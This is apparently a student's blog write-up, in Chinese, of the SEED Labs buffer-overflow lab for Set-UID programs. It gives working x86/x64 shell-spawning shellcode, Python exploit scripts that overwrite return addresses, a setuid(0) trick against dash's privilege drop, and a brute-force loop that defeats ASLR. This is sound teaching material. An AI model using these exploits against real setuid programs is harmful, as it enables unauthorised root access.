---
title: Buffer-Overflow-Attack-Lab(Set-UID-Version)
categories:
  - SeedLabs/SoftwareSecurity
tags:
  - Buffer-Overflow
abbrlink: 245267c1
date: 2022-11-10 22:16:40
---

## 环境准备

安装好提供的环境，然后执行如下操作：

```bash
 sudo sysctl -w kernel.randomize_va_space=0 # 关闭地址随机化
 sudo ln -sf /bin/zsh /bin/sh # 将有安全机制的 sh 链接到没有安全机制 zsh
```

**StackGuard and Non-Executable Stack**

## Getting Familiar with Shellcode

C 语言版的 `shellcode`

```c
#include <stdio.h>

int main() {
	char *name[2];
	name[0] = "bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
}
```

但是我们不能够拿这个代码编译生成的二进制就当作了 `shellcode`。

32 位的汇编版

```assembly
; Store the command on stack
xor eax, eax
push eax
push "//sh"
push "/bin"
mov ebx, esp ; ebx --> "/bin//sh": execve()’s 1st argument
; Construct the argument array argv[]
push eax ; argv[1] = 0
push ebx ; argv[0] --> "/bin//sh"
mov ecx, esp ; ecx --> argv[]: execve()’s 2nd argument
; For environment variable
xor edx, edx ; edx = 0: execve()’s 3rd argument
; Invoke execve()
xor eax, eax ;
mov al, 0x0b ; execve()’s system call number
int 0x80
```

64 位的汇编版

```assembly
xor rdx, rdx ; rdx = 0: execve()’s 3rd argument
push rdx
mov rax, ’/bin//sh’ ; the command we want to run
push rax ;
mov rdi, rsp ; rdi --> "/bin//sh": execve()’s 1st argument
push rdx ; argv[1] = 0
push rdi ; argv[0] --> "/bin//sh"
mov rsi, rsp ; rsi --> argv[]: execve()’s 2nd argument
xor rax, rax
mov al, 0x3b ; execve()’s system call number
syscall
```

## Task: Invoking the Shellcode

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0) 
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"

const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}
```

我们得到两个版本的 `shellcode`（`shellcode` 如何编写不是这个实验的重点），这个程序就是将这段 `shellcode` 当作代码段运行。

```makefile
all: 
	gcc -m32 -z execstack -o a32.out call_shellcode.c
	gcc -z execstack -o a64.out call_shellcode.c

setuid:
	gcc -m32 -z execstack -o a32.out call_shellcode.c
	gcc -z execstack -o a64.out call_shellcode.c
	sudo chown root a32.out a64.out
	sudo chmod 4755 a32.out a64.out

clean:
	rm -f a32.out a64.out *.o
```

`-m32` 表示编译生成 32 位程序，`-z execstack` 表示运行代码在栈上运行。执行 `make setuid` 命令后我们可以得到两个可执行程序。分别执行之：

![image-20221107191054609](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107191054609.png)

可以看到，我们拿到了 `root` 权限的 `shell` 进程。

## Task 2: Understanding the Vulnerable Program

我们要攻击的代码总体如下：

```c
int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);       

    return 0;
}

void dummy_function(char *str)
{
    char dummy_buffer[1000];
    memset(dummy_buffer, 0, 1000);
    bof(str);
}
```

main 函数在调用 `bof` 还调用了 `dummy_function`，我认为最主要的作用就是为 `bof` 和 `main` 之间留出足够的可插入 `shellcode` 的空间。

我们将代码编译生成 `L1` 到 `L4` 这 4 个版本，前两个版本是 32 位，后两个版本是 64 位，并且每个版本都有普通版和 `debug` 版。再将普通版设为 `Setuid` 程序。其中 `L1` 的 `BUF_SIZE` 是 100，`L2` 的 `BUF_SIZE` 是 100 到 200 之间，`L3` 的 `BUF_SIZE` 是 200，`L4` 的 `BUF_SIZE` 是 10。

## Launching Attack on 32-bit Program (Level 1)

我们首先调试 `stack-L1-dbg` 得到一些数据：

```
gdb-peda$ p &buffer
$1 = (char (*)[100]) 0xffffcaec
gdb-peda$ p $ebp
$2 = (void *) 0xffffcb58
gdb-peda$ p/d 0xffffcb58 - 0xffffcaec
$3 = 108
```

我们可以看到 `$ebp=0xffffcb58`，这也就说明返回地址存储在 `0xffffcb5c` 这个位置，相对于 &buffer 偏移了 108 + 4 也就是 112 这个位置。我们需要将这个位置修改，改成我们希望跳转执行的位置。

```python
# Replace the content with the actual shellcode
shellcode= (
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
   "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
   "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

# Put the shellcode somewhere in the payload
start = 300    # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0xffffcaec + start # Change this number 
offset = 112    	        # Change this number 

L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

我们把上面 32 位的 `shellcode` 复制过来，然后 `ret` 就是要返回跳转的位置，我们设为 `0xffffcaec + start` 也就是 `&buffer` 偏移 `start` 的位置，我们希望代码从 `&buffer` 开始执行。并且把 `shellcode` 插入到 `&buffer` 偏移 `start` 的位置（`content` 会被复制到 `buffer`）。

下面依次是 `start` = 0，200，300，400 的结果：

![image-20221107194740540](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107194740540.png)

等于 0 表示我们把 `shellcode` 放在 `bof` 函数栈内，可能是在函数退出之后，栈空间会被回收，因此导致了错误。等于 200 出现问题我感觉到匪夷所思。我调试了一下，在 `debug` 模式下可以工作，因此可能是普通模式没有 `gdb` 信息时这个地址在两个栈中间，影响到了重要的硬件指令。后面两个已经到 `dummy_function` 栈内了，因此可以正常工作。

## Task 4: Launching Attack without Knowing Buffer Size (Level 2)

在这个任务下，我们不知道 `buffer` 的大小，只知道是 100 到 200。但是，我们还是可以使用 `gdb` 得到 `&buffer` 的地址，只是不能得到 `$ebp` 的地址罢了。我们先把 `ret` 的值修改为 `&buffer`，然后把函数每个可能的 `ret` 位置都修改为我们的 `ret`，并且将 `start` 设为 400 或者 `517 - len(shellcode)`。

```python
for offset in range(0, 288, L):
   content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
```

根据我的测试，第二个数最大就是 288 了，292 就会抛出错误，可能是把某个重要指令被无意义数据给覆盖了。

##  Task 5: Launching Attack on 64-bit Program (Level 3)

64 位地址长这个样，`0x00007FFFFFFFFFFF` 也就是地址中有 0，在执行 `strcpy(buffer, str);` 的时候遇到 0 就停止了， 0 后面的内容不会被拷贝。这也就意味着 `shellcode` 不能放在 `ret` 的后面，只能放在 `ret` 的前面。并且地址还是小端序，`ret` 的低位非 0 会先拷贝，高位 0 不拷贝，但是之前的地址高位也是 0，所以没关系。

使用 GDB 调试得到数据如下：

```
gdb-peda$ p $rbp
$4 = (void *) 0x7fffffffd9c0
gdb-peda$ p &buffer
$5 = (char (*)[200]) 0x7fffffffd8f0
gdb-peda$ p/d 0x7fffffffd9c0 - 0x7fffffffd8f0
$7 = 208
```

我们需要在修改 `exploit.py` 如下，将 `shellcode` 修改为 64 位的，然后将 `start` 设为 0（把 `shellcode` 放在 ret 前面），然后把 `ret` 的值设为 `&buffer`：

```python
#!/usr/bin/python3
import sys

# Replace the content with the actual shellcode
shellcode= (
   "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
   "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
   "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for i in range(517)) 

##################################################################
# Put the shellcode somewhere in the payload
start = 0    # Change this number 
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x7fffffffd8f0 + start                         # Change this number 
offset = 216    # Change this number 

L = 8    # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)
```

执行结果如下，折磨一天了，我是没什么办法了：

![image-20221107224553348](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107224553348.png)

今天看到一个博主的文章，发现他填的参数很奇怪，又试了一次，诶嘿，居然通过了（使用的参数为 start = 96， ret = 0x7fffffffd850 + 160）：

![image-20221109231459697](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109231459697.png)

我将 attack.c 添加了一条 printf，输出 buffer 的地址，并且我还在 gdb 调试 stack-L3-dbg 时打印了 buffer 的地址：

```bash
$ ./stack-L3  
Input size: 517
buffer address: 7fffffffd8f0                                             
$ ./stack-L3-dbg 
Input size: 517
buffer address: 7fffffffd8e0
gdb-peda$ p &buffer
$1 = (char (*)[200]) 0x7fffffffd850
```

可以看到地址是各不相同的，0x7fffffffd850 + 160 就是 0x7fffffffd8f0，也就是 buffer 在 stack-L3 的地址首位。其实 32 位也会出现这种情况，所以有些我以为能够运行的结果无法运行，就是因为实际运行和调试出来的地址有点区别。我一直想着不能动 stack.c 函数，其实改一下代码就会发现问题所在了，白白浪费了很多时间。

就是实际运行和调试之间会有一定的地址偏移，因此我们需要调整一下我们的数据。

## Task 6: Launching Attack on 64-bit Program (Level 4)

这里我们的缓冲区很小，存不下 shellcode，但是我们还有一个源头啊，就是 main 函数中的 str 有 shellcode，我们可以使得函数执行 main 中的 shellcode。

```
gdb-peda$ p $rbp
$2 = (void *) 0x7fffffffd9c0
gdb-peda$ p &buffer
$3 = (char (*)[10]) 0x7fffffffd9b6
gdb-peda$ p str
$4 = 0x7fffffffdd50 "H1\322RH\270/bin//shPH\211\347RWH\211\346H1\300\260;\017\005", '\220' <repeats 170 times>...
gdb-peda$ p &str
$5 = (char **) 0x7fffffffd9a8
```

然后按照这个思路修改 `exploit.py` 如下:

```python
start = 517 - len(shellcode)    # 放最后面，容错率高一点
content[start:start + len(shellcode)] = shellcode

# Decide the return address value 
# and put it somewhere in the payload
ret    = 0x7fffffffdd50 + 270   # 270 为适当的偏移
offset = 18    # Change this number 
```

这样就可以了，这个适当偏移很有玄学的概念，我们可以使用一个脚本来穷举：

```python
ret = 0x7fffffffdd80 + int(sys.argv[1]) # &input 的地址并适当偏移
print(int(sys.argv[1]))
offset = 18    # Change this number
```

脚本如下：

```shell
#!/bin/bash

value=-200

while true; do
  value=$(( $value + 10 ))
  ./exploit.py $value
  ./stack-L4
done
```

结果还是比较奇妙的（不懂为什么 200 可以，中间的一些数又不可以，然后后面又可以）：

![img](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/2022-11-13_16-23.png)

##  Tasks 7: Defeating dash’s Countermeasure

在 ubuntu 中， dash shell 检测到有效的 UID 和真实 UID 不相等就会放弃特权。前面我们将 sh 链接到 zsh 来解决的这个问题，现在我们来尝试新的对策。首先链接回原来的：

```
sudo ln -sf /bin/dash /bin/sh
```

在调用 execve() 之前将真实 ID 修改为 0 即可，也就是调用 setuid(0)。我们把 call_shellcode.c 中注释掉的二进制代码加入到 shellcode 的开头就行了。

![image-20221107232111827](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107232111827.png)

重复 Level1，可以看到，在 sh 链接到 dash 的情况下我们拿到了 root 权限：

![image-20221107232616406](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221107232616406.png)

## Task 8: Defeating Address Randomization

在 32 位系统下，栈只有 19 位熵，我们可以穷举破解它，首先，打开地址随机化：

```
 sudo /sbin/sysctl -w kernel.randomize_va_space=2
```

然后编写一个脚本，不断的执行攻击，然后就是碰运气了：

```bash
#!/bin/bash

SECONDS=0
value=0

while true; do
  value=$(( $value + 1 ))
  duration=$SECONDS
  min=$(($duration / 60))
  sec=$(($duration % 60))
  echo "$min minutes and $sec seconds elapsed."
  echo "The program has been running $value times so far."
  ./stack-L1
done
```

## Tasks 9: Experimenting with Other Countermeasures

`Turn on the StackGuard Protection` 和  `Turn on the Non-executable Stack Protection`，打开这两个之后，攻击肯定是成功不了的。

- 栈保护机制（StackGuard Protection），`gcc` 编译器实现的安全机制，阻止缓冲区溢出漏洞。你可以关闭这种机制，通过在编译时使用 `-fno-stack-protector` 选项。
- 栈不可执行（Non-Executable Stack），`ubuntu` 默认栈不可执行，可以通过在编译的时候使用 `-z execstack` 选项来使堆栈可执行。

在只需要在栈上执行我们的数据的情况下，可以不用关闭 `StackGuard Protection`，比如 `call_shellcode.c` 在编译的时候就没有 `-fno-stack-protector` ，因为不需要溢出。但是栈上可执行都是要的吧。

